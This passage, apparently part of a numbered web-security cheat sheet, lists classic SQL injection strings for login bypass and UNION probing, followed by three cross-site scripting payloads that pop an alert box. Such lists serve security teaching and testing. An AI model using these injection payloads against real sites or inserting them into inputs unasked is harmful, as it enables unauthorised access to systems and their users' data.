' OR '1'='1
' OR '1'='1' --
admin' --
' UNION SELECT NULL--

3. Cross-Site Scripting (XSS)

Payload examples:

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

